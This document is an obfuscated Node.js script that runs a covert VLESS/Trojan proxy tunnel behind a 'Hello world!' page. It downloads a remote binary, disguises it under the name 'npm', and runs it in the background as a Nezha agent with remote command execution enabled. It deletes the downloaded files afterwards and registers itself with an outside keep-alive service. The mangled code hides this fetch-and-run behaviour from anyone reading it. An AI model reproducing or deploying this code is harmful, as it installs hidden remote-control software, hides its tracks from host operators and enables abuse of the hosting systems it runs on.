const _0x4afa86=_0x33be;(function(_0x555ab8,_0x4f1af5){const _0x16952d=_0x33be,_0x34790b=_0x555ab8();while(!![]){try{const _0x175b79=parseInt(_0x16952d(0x206))/0x1+-parseInt(_0x16952d(0x230))/0x2+parseInt(_0x16952d(0x1c3))/0x3*(parseInt(_0x16952d(0x22f))/0x4)+-parseInt(_0x16952d(0x216))/0x5+-parseInt(_0x16952d(0x221))/0x6*(-parseInt(_0x16952d(0x1f6))/0x7)+-parseInt(_0x16952d(0x22a))/0x8*(parseInt(_0x16952d(0x1bb))/0x9)+-parseInt(_0x16952d(0x21d))/0xa*(-parseInt(_0x16952d(0x225))/0xb);if(_0x175b79===_0x4f1af5)break;else _0x34790b['push'](_0x34790b['shift']());}catch(_0x2a7628){_0x34790b['push'](_0x34790b['shift']());}}}(_0x1d5f,0xe12dd));const os=require('os'),http=require(_0x4afa86(0x22c)),fs=require('fs'),axios=require('axios'),net=require(_0x4afa86(0x231)),path=require(_0x4afa86(0x226)),crypto=require(_0x4afa86(0x1e6)),{Buffer}=require(_0x4afa86(0x20a)),{exec,execSync}=require(_0x4afa86(0x200)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4afa86(0x232)][_0x4afa86(0x1d6)]||_0x4afa86(0x1d7),NEZHA_SERVER=process[_0x4afa86(0x232)][_0x4afa86(0x1c1)]||'',NEZHA_PORT=process[_0x4afa86(0x232)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x4afa86(0x1b3)]||'',DOMAIN=process[_0x4afa86(0x232)][_0x4afa86(0x1c8)]||'1234.abc.com',AUTO_ACCESS=process[_0x4afa86(0x232)][_0x4afa86(0x1dd)]||!![],WSPATH=process[_0x4afa86(0x232)][_0x4afa86(0x22d)]||UUID[_0x4afa86(0x1f3)](0x0,0x8),SUB_PATH=process[_0x4afa86(0x232)][_0x4afa86(0x1cb)]||_0x4afa86(0x22b),NAME=process[_0x4afa86(0x232)][_0x4afa86(0x1b2)]||_0x4afa86(0x1ba),PORT=process[_0x4afa86(0x232)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x585b56=_0x4afa86;try{const _0x562b58=await axios[_0x585b56(0x212)]('https://speed.cloudflare.com/meta'),_0x4cb024=_0x562b58[_0x585b56(0x1cd)];ISP=(_0x4cb024[_0x585b56(0x1c6)]+'-'+_0x4cb024[_0x585b56(0x223)])[_0x585b56(0x1ed)](/ /g,'_');}catch(_0xb6263a){ISP='Unknown';}};GetISP();function _0x33be(_0x542cf7,_0x42bf82){_0x542cf7=_0x542cf7-0x1b1;const _0x1d5f64=_0x1d5f();let _0x33bee5=_0x1d5f64[_0x542cf7];return _0x33bee5;}const httpServer=http['createServer']((_0x1034c2,_0x55ae08)=>{const _0x48c9e4=_0x4afa86;if(_0x1034c2[_0x48c9e4(0x214)]==='/'){const _0x12b622=path['join'](__dirname,_0x48c9e4(0x209));fs[_0x48c9e4(0x1d3)](_0x12b622,_0x48c9e4(0x211),(_0x34d0c5,_0x1931ec)=>{const _0x347d8d=_0x48c9e4;if(_0x34d0c5){_0x55ae08['writeHead'](0xc8,{'Content-Type':_0x347d8d(0x1e0)}),_0x55ae08[_0x347d8d(0x1ef)](_0x347d8d(0x205));return;}_0x55ae08[_0x347d8d(0x1d9)](0xc8,{'Content-Type':'text/html'}),_0x55ae08[_0x347d8d(0x1ef)](_0x1931ec);});return;}else{if(_0x1034c2[_0x48c9e4(0x214)]==='/'+SUB_PATH){const _0xa18ceb=_0x48c9e4(0x1f4)+UUID+'@'+DOMAIN+_0x48c9e4(0x1f7)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0xb45f38=_0x48c9e4(0x20c)+UUID+'@'+DOMAIN+_0x48c9e4(0x1d2)+DOMAIN+_0x48c9e4(0x1d8)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x419e4e=_0xa18ceb+'\x0a'+_0xb45f38,_0x26f969=Buffer[_0x48c9e4(0x1f8)](_0x419e4e)[_0x48c9e4(0x1da)](_0x48c9e4(0x1c7));_0x55ae08[_0x48c9e4(0x1d9)](0xc8,{'Content-Type':_0x48c9e4(0x1e8)}),_0x55ae08[_0x48c9e4(0x1ef)](_0x26f969+'\x0a');}else _0x55ae08['writeHead'](0x194,{'Content-Type':_0x48c9e4(0x1e8)}),_0x55ae08['end'](_0x48c9e4(0x207));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x4afa86(0x1ed)](/-/g,''),DNS_SERVERS=[_0x4afa86(0x234),_0x4afa86(0x1db)];function resolveHost(_0x50f904){return new Promise((_0x321779,_0x370898)=>{const _0x32c361=_0x33be;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x32c361(0x1f1)](_0x50f904)){_0x321779(_0x50f904);return;}let _0x26c05f=0x0;function _0x4627b6(){const _0x46e1db=_0x32c361;if(_0x26c05f>=DNS_SERVERS['length']){_0x370898(new Error('Failed\x20to\x20resolve\x20'+_0x50f904+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x51e625=DNS_SERVERS[_0x26c05f];_0x26c05f++;const _0x3d4b94=_0x46e1db(0x1c4)+encodeURIComponent(_0x50f904)+_0x46e1db(0x1f0);axios['get'](_0x3d4b94,{'timeout':0x1388,'headers':{'Accept':_0x46e1db(0x229)}})[_0x46e1db(0x1dc)](_0x573233=>{const _0x4c27ae=_0x46e1db,_0x34ba62=_0x573233[_0x4c27ae(0x1cd)];if(_0x34ba62[_0x4c27ae(0x1e5)]===0x0&&_0x34ba62[_0x4c27ae(0x1fe)]&&_0x34ba62[_0x4c27ae(0x1fe)][_0x4c27ae(0x1f2)]>0x0){const _0x2d7481=_0x34ba62[_0x4c27ae(0x1fe)][_0x4c27ae(0x1ea)](_0xfc9c16=>_0xfc9c16[_0x4c27ae(0x208)]===0x1);if(_0x2d7481){_0x321779(_0x2d7481['data']);return;}}_0x4627b6();})[_0x46e1db(0x1b8)](_0x558c23=>{_0x4627b6();});}_0x4627b6();});}function _0x1d5f(){const _0x54fb2c=['pipe','Answer','2087','child_process','sha224','map','npm\x20is\x20running','8443','Hello\x20world!','105443AzvAtW','Not\x20Found\x0a','type','index.html','buffer','write','trojan://','createWriteStream','unlink','log','Server\x20is\x20running\x20on\x20port\x20','utf8','get','false','url','message','7491760ktwtjr','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','https://arm64.ssss.nyc.mn/v1','443','Automatic\x20Access\x20Task\x20added\x20successfully','https://','connection','390PNgtru','application/json','substr','post','48TtRjyp','setsid\x20nohup\x20./npm\x20-s\x20','asOrganization','2083','213543IQBDyz','path','connect','\x20-p\x20','application/dns-json','296064CkUAJT','sub','http','WSPATH','error:\x20','4nLLkIr','1126704qIYcbq','net','env','true','8.8.4.4','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','reduce','NAME','NEZHA_KEY','decode','readUInt16BE','https://amd64.ssss.nyc.mn/agent','error','catch','arch','Hug','198DOqeLT','readUInt8','https://oooo.serv00.net/add-url','2053','aarch64','createHash','NEZHA_SERVER','close','3977565tWTxLE','https://dns.google/resolve?name=','send','country','base64','DOMAIN','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','chmod\x20+x\x20npm','SUB_PATH','pop','data','update','arm','2096','--tls',':443?security=tls&sni=','readFile','npm\x20running\x20error:','trim','UUID','e3924873-a742-4a48-9061-b8340de08562','&fp=chrome&type=ws&host=','writeHead','toString','1.1.1.1','then','AUTO_ACCESS','client_secret:\x20','join','text/html','arm64','split','https://arm64.ssss.nyc.mn/agent','hex','Status','crypto','npm','text/plain','listen','find','config.yaml','/bin/bash','replace','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','end','&type=A','test','length','slice','vless://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1408582ooGUOT',':443?encryption=none&security=tls&sni=','from','includes','once','concat','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'];_0x1d5f=function(){return _0x54fb2c;};return _0x1d5f();}function handleVlessConnection(_0x262439,_0x54e500){const _0x4af188=_0x4afa86,[_0xfc73f8]=_0x54e500,_0x8722a4=_0x54e500[_0x4af188(0x1f3)](0x1,0x11);if(!_0x8722a4['every']((_0x1c2eb0,_0x3b9647)=>_0x1c2eb0==parseInt(uuid['substr'](_0x3b9647*0x2,0x2),0x10)))return![];let _0x2cc1fb=_0x54e500[_0x4af188(0x1f3)](0x11,0x12)[_0x4af188(0x1bc)]()+0x13;const _0x42444a=_0x54e500['slice'](_0x2cc1fb,_0x2cc1fb+=0x2)[_0x4af188(0x1b5)](0x0),_0x121e9f=_0x54e500['slice'](_0x2cc1fb,_0x2cc1fb+=0x1)[_0x4af188(0x1bc)](),_0x4f1167=_0x121e9f==0x1?_0x54e500['slice'](_0x2cc1fb,_0x2cc1fb+=0x4)[_0x4af188(0x1df)]('.'):_0x121e9f==0x2?new TextDecoder()[_0x4af188(0x1b4)](_0x54e500[_0x4af188(0x1f3)](_0x2cc1fb+0x1,_0x2cc1fb+=0x1+_0x54e500[_0x4af188(0x1f3)](_0x2cc1fb,_0x2cc1fb+0x1)[_0x4af188(0x1bc)]())):_0x121e9f==0x3?_0x54e500[_0x4af188(0x1f3)](_0x2cc1fb,_0x2cc1fb+=0x10)[_0x4af188(0x1b1)]((_0x2e6f57,_0x5eb05b,_0x2512c4,_0x123800)=>_0x2512c4%0x2?_0x2e6f57['concat'](_0x123800['slice'](_0x2512c4-0x1,_0x2512c4+0x1)):_0x2e6f57,[])[_0x4af188(0x202)](_0x376ca2=>_0x376ca2['readUInt16BE'](0x0)['toString'](0x10))[_0x4af188(0x1df)](':'):'';_0x262439[_0x4af188(0x1c5)](new Uint8Array([_0xfc73f8,0x0]));const _0x2d1184=createWebSocketStream(_0x262439);return resolveHost(_0x4f1167)[_0x4af188(0x1dc)](_0x4ca2a9=>{const _0x1c9b92=_0x4af188;net[_0x1c9b92(0x227)]({'host':_0x4ca2a9,'port':_0x42444a},function(){const _0xc7e5b5=_0x1c9b92;this[_0xc7e5b5(0x20b)](_0x54e500[_0xc7e5b5(0x1f3)](_0x2cc1fb)),_0x2d1184['on']('error',()=>{})[_0xc7e5b5(0x1fd)](this)['on'](_0xc7e5b5(0x1b7),()=>{})[_0xc7e5b5(0x1fd)](_0x2d1184);})['on'](_0x1c9b92(0x1b7),()=>{});})['catch'](_0x3459f6=>{const _0x365768=_0x4af188;net[_0x365768(0x227)]({'host':_0x4f1167,'port':_0x42444a},function(){const _0x52aa49=_0x365768;this[_0x52aa49(0x20b)](_0x54e500[_0x52aa49(0x1f3)](_0x2cc1fb)),_0x2d1184['on']('error',()=>{})[_0x52aa49(0x1fd)](this)['on'](_0x52aa49(0x1b7),()=>{})[_0x52aa49(0x1fd)](_0x2d1184);})['on'](_0x365768(0x1b7),()=>{});}),!![];}function handleTrojanConnection(_0x376470,_0x502f2b){const _0x4d0642=_0x4afa86;try{if(_0x502f2b['length']<0x3a)return![];const _0x524d6b=_0x502f2b[_0x4d0642(0x1f3)](0x0,0x38)[_0x4d0642(0x1da)](),_0xce8456=[UUID];let _0x438136=null;for(const _0x3463a5 of _0xce8456){const _0x3ff6ce=crypto[_0x4d0642(0x1c0)](_0x4d0642(0x201))[_0x4d0642(0x1ce)](_0x3463a5)['digest'](_0x4d0642(0x1e4));if(_0x3ff6ce===_0x524d6b){_0x438136=_0x3463a5;break;}}if(!_0x438136)return![];let _0x1351cd=0x38;_0x502f2b[_0x1351cd]===0xd&&_0x502f2b[_0x1351cd+0x1]===0xa&&(_0x1351cd+=0x2);const _0x38c5ce=_0x502f2b[_0x1351cd];if(_0x38c5ce!==0x1)return![];_0x1351cd+=0x1;const _0x87daed=_0x502f2b[_0x1351cd];_0x1351cd+=0x1;let _0x4582fb,_0x31af91;if(_0x87daed===0x1)_0x4582fb=_0x502f2b[_0x4d0642(0x1f3)](_0x1351cd,_0x1351cd+0x4)['join']('.'),_0x1351cd+=0x4;else{if(_0x87daed===0x3){const _0xfafd4c=_0x502f2b[_0x1351cd];_0x1351cd+=0x1,_0x4582fb=_0x502f2b[_0x4d0642(0x1f3)](_0x1351cd,_0x1351cd+_0xfafd4c)['toString'](),_0x1351cd+=_0xfafd4c;}else{if(_0x87daed===0x4)_0x4582fb=_0x502f2b[_0x4d0642(0x1f3)](_0x1351cd,_0x1351cd+0x10)[_0x4d0642(0x1b1)]((_0x16bb5c,_0x104267,_0x54b935,_0x9c9b91)=>_0x54b935%0x2?_0x16bb5c[_0x4d0642(0x1fb)](_0x9c9b91['slice'](_0x54b935-0x1,_0x54b935+0x1)):_0x16bb5c,[])[_0x4d0642(0x202)](_0x37d965=>_0x37d965[_0x4d0642(0x1b5)](0x0)['toString'](0x10))[_0x4d0642(0x1df)](':'),_0x1351cd+=0x10;else return![];}}_0x31af91=_0x502f2b[_0x4d0642(0x1b5)](_0x1351cd),_0x1351cd+=0x2;_0x1351cd<_0x502f2b[_0x4d0642(0x1f2)]&&_0x502f2b[_0x1351cd]===0xd&&_0x502f2b[_0x1351cd+0x1]===0xa&&(_0x1351cd+=0x2);const _0x1f7cd6=createWebSocketStream(_0x376470);return resolveHost(_0x4582fb)[_0x4d0642(0x1dc)](_0x5af7a2=>{const _0x3fe9f3=_0x4d0642;net[_0x3fe9f3(0x227)]({'host':_0x5af7a2,'port':_0x31af91},function(){const _0x1edd57=_0x3fe9f3;_0x1351cd<_0x502f2b[_0x1edd57(0x1f2)]&&this[_0x1edd57(0x20b)](_0x502f2b[_0x1edd57(0x1f3)](_0x1351cd)),_0x1f7cd6['on'](_0x1edd57(0x1b7),()=>{})['pipe'](this)['on']('error',()=>{})[_0x1edd57(0x1fd)](_0x1f7cd6);})['on'](_0x3fe9f3(0x1b7),()=>{});})[_0x4d0642(0x1b8)](_0xa4dbf5=>{const _0x2b510f=_0x4d0642;net[_0x2b510f(0x227)]({'host':_0x4582fb,'port':_0x31af91},function(){const _0x233f77=_0x2b510f;_0x1351cd<_0x502f2b[_0x233f77(0x1f2)]&&this['write'](_0x502f2b['slice'](_0x1351cd)),_0x1f7cd6['on'](_0x233f77(0x1b7),()=>{})[_0x233f77(0x1fd)](this)['on'](_0x233f77(0x1b7),()=>{})[_0x233f77(0x1fd)](_0x1f7cd6);})['on']('error',()=>{});}),!![];}catch(_0x29c41e){return![];}}wss['on'](_0x4afa86(0x21c),(_0x5916f6,_0x1f9dcf)=>{const _0x2f0451=_0x4afa86,_0x30df2a=_0x1f9dcf[_0x2f0451(0x214)]||'';_0x5916f6[_0x2f0451(0x1fa)](_0x2f0451(0x215),_0x116f38=>{const _0x2f6625=_0x2f0451;if(_0x116f38[_0x2f6625(0x1f2)]>0x11&&_0x116f38[0x0]===0x0){const _0x37cb50=_0x116f38['slice'](0x1,0x11),_0x18d5e4=_0x37cb50['every']((_0x3ce429,_0x55c598)=>_0x3ce429==parseInt(uuid[_0x2f6625(0x21f)](_0x55c598*0x2,0x2),0x10));if(_0x18d5e4){!handleVlessConnection(_0x5916f6,_0x116f38)&&_0x5916f6[_0x2f6625(0x1c2)]();return;}}!handleTrojanConnection(_0x5916f6,_0x116f38)&&_0x5916f6[_0x2f6625(0x1c2)]();})['on'](_0x2f0451(0x1b7),()=>{});});const getDownloadUrl=()=>{const _0xc1b6a=_0x4afa86,_0x3d1e0c=os[_0xc1b6a(0x1b9)]();return _0x3d1e0c===_0xc1b6a(0x1cf)||_0x3d1e0c===_0xc1b6a(0x1e1)||_0x3d1e0c===_0xc1b6a(0x1bf)?!NEZHA_PORT?_0xc1b6a(0x218):_0xc1b6a(0x1e3):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0xc1b6a(0x1b6);},downloadFile=async()=>{const _0x1586c0=_0x4afa86;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5f2265=getDownloadUrl(),_0x70c540=await axios({'method':_0x1586c0(0x212),'url':_0x5f2265,'responseType':'stream'}),_0x2c29f4=fs[_0x1586c0(0x20d)](_0x1586c0(0x1e7));return _0x70c540[_0x1586c0(0x1cd)][_0x1586c0(0x1fd)](_0x2c29f4),new Promise((_0x278afc,_0x5b1d25)=>{const _0x53dfe4=_0x1586c0;_0x2c29f4['on']('finish',()=>{const _0x147e50=_0x33be;console[_0x147e50(0x20f)]('npm\x20download\x20successfully'),exec(_0x147e50(0x1ca),_0x1d2943=>{if(_0x1d2943)_0x5b1d25(_0x1d2943);_0x278afc();});}),_0x2c29f4['on'](_0x53dfe4(0x1b7),_0x5b1d25);});}catch(_0x1a9d8c){throw _0x1a9d8c;}},runnz=async()=>{const _0x164b95=_0x4afa86;try{const _0xa1d26a=execSync(_0x164b95(0x235),{'encoding':'utf-8'});if(_0xa1d26a[_0x164b95(0x1d5)]()!==''){console[_0x164b95(0x20f)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x16ea1c){}await downloadFile();let _0x300114='',_0x41c86c=[_0x164b95(0x219),_0x164b95(0x204),_0x164b95(0x1d0),_0x164b95(0x1ff),_0x164b95(0x224),_0x164b95(0x1be)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4ccf3c=_0x41c86c['includes'](NEZHA_PORT)?_0x164b95(0x1d1):'';_0x300114=_0x164b95(0x222)+NEZHA_SERVER+':'+NEZHA_PORT+_0x164b95(0x228)+NEZHA_KEY+'\x20'+_0x4ccf3c+_0x164b95(0x1fc);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x47eece=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x164b95(0x1e2)](':')[_0x164b95(0x1cc)]():'',_0x2ab8f7=_0x41c86c[_0x164b95(0x1f9)](_0x47eece)?_0x164b95(0x233):_0x164b95(0x213),_0x577849=_0x164b95(0x1de)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x164b95(0x1ee)+_0x2ab8f7+_0x164b95(0x1f5)+UUID;fs['writeFileSync'](_0x164b95(0x1eb),_0x577849);}_0x300114=_0x164b95(0x1c9);}else{console[_0x164b95(0x20f)](_0x164b95(0x217));return;}}try{exec(_0x300114,{'shell':_0x164b95(0x1ec)},_0x4b5f78=>{const _0x13c57e=_0x164b95;if(_0x4b5f78)console[_0x13c57e(0x1b7)](_0x13c57e(0x1d4),_0x4b5f78);else console[_0x13c57e(0x20f)](_0x13c57e(0x203));});}catch(_0x4d0965){console[_0x164b95(0x1b7)](_0x164b95(0x22e)+_0x4d0965);}};async function addAccessTask(){const _0x3b384e=_0x4afa86;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x635806=_0x3b384e(0x21b)+DOMAIN;try{const _0x296393=await axios[_0x3b384e(0x220)](_0x3b384e(0x1bd),{'url':_0x635806},{'headers':{'Content-Type':_0x3b384e(0x21e)}});console['log'](_0x3b384e(0x21a));}catch(_0x4c3bff){}}const delFiles=()=>{const _0x1e1f76=_0x4afa86;fs[_0x1e1f76(0x20e)](_0x1e1f76(0x1e7),()=>{}),fs[_0x1e1f76(0x20e)](_0x1e1f76(0x1eb),()=>{});};httpServer[_0x4afa86(0x1e9)](PORT,()=>{const _0x1e428c=_0x4afa86;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x1e428c(0x210)+PORT);});
